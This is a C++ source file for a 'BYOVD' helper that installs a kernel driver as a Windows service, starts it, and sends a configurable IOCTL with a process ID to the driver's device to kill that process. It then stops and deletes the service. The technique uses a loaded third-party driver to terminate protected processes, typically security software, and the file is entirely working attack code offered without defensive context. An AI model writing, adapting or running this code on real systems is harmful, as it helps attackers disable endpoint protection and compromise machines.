#include "byovd.h"
#include "utils.h"
#include <iostream>
#include <fstream>

BYOVD::BYOVD(const DriverConfig& driverConfig) 
    : config(driverConfig), scManager(nullptr), service(nullptr) {
}

BYOVD::~BYOVD() {
    Close();
}

bool BYOVD::Initialize() {
    scManager = OpenSCManagerA(nullptr, nullptr, SC_MANAGER_CREATE_SERVICE);
    if (!scManager) {
        std::cerr << "[-] Failed to open service manager, error: " << GetLastError() << std::endl;
        return false;
    }
    
    service = OpenServiceA(scManager, config.name.c_str(), SERVICE_ALL_ACCESS);
    
    if (!service) {
        service = CreateDriverService();
        if (!service) {
            CloseServiceHandle(scManager);
            return false;
        }
    } else {
        UpdateServicePath();
    }
    
    return true;
}

SC_HANDLE BYOVD::CreateDriverService() {
    std::string driverPath = GetDriverPath();
    
    std::ifstream file(driverPath);
    if (!file.good()) {
        std::cerr << "[-] Driver file not found: " << driverPath << std::endl;
        return nullptr;
    }
    file.close();
    
    SC_HANDLE svc = CreateServiceA(
        scManager,
        config.name.c_str(),
        config.name.c_str(),
        SERVICE_ALL_ACCESS,
        SERVICE_KERNEL_DRIVER,
        SERVICE_DEMAND_START, 
        SERVICE_ERROR_NORMAL,
        driverPath.c_str(),
        nullptr, nullptr, nullptr, nullptr, nullptr
    );
    
    if (!svc) {
        std::cerr << "[-] CreateService failed, error: " << GetLastError() << std::endl;
        return nullptr;
    }
    
    return svc;
}

bool BYOVD::UpdateServicePath() {
    std::string driverPath = GetDriverPath();
    
    BOOL result = ChangeServiceConfigA(
        service,
        SERVICE_NO_CHANGE,
        SERVICE_NO_CHANGE,
        SERVICE_NO_CHANGE,
        driverPath.c_str(),
        nullptr, nullptr, nullptr, nullptr, nullptr, nullptr
    );
    
    return result != 0;
}

bool BYOVD::Start() {
    if (!StartServiceA(service, 0, nullptr)) {
        DWORD error = GetLastError();
        if (error == ERROR_SERVICE_ALREADY_RUNNING) {
            return true; 
        }
        std::cerr << "[-] Failed to start service, error: " << error << std::endl;
        return false;
    }
    return true;
}

bool BYOVD::Stop() {
    SERVICE_STATUS serviceStatus;
    ControlService(service, SERVICE_CONTROL_STOP, &serviceStatus);
    
    if (DeleteService(service)) {
        std::cout << "[-] Service marked for deletion" << std::endl;
        return true;
    }
    return false;
}

bool BYOVD::KillProcess(DWORD pid) {
    HANDLE deviceHandle = CreateFileA(
        config.devicePath.c_str(),
        GENERIC_READ | GENERIC_WRITE,
        0, nullptr,
        OPEN_EXISTING,
        FILE_ATTRIBUTE_NORMAL,
        nullptr
    );
    
    if (deviceHandle == INVALID_HANDLE_VALUE) {
        return false;
    }
    
    DWORD bytesReturned;
    DWORD outputBuffer;
    
    BOOL result = DeviceIoControl(
        deviceHandle,
        config.ioctlCode,
        &pid, sizeof(pid),
        &outputBuffer, sizeof(outputBuffer),
        &bytesReturned,
        nullptr
    );
    
    CloseHandle(deviceHandle);
    return result != 0;
}

void BYOVD::Close() {
    if (service) {
        CloseServiceHandle(service);
        service = nullptr;
    }
    if (scManager) {
        CloseServiceHandle(scManager);
        scManager = nullptr;
    }
}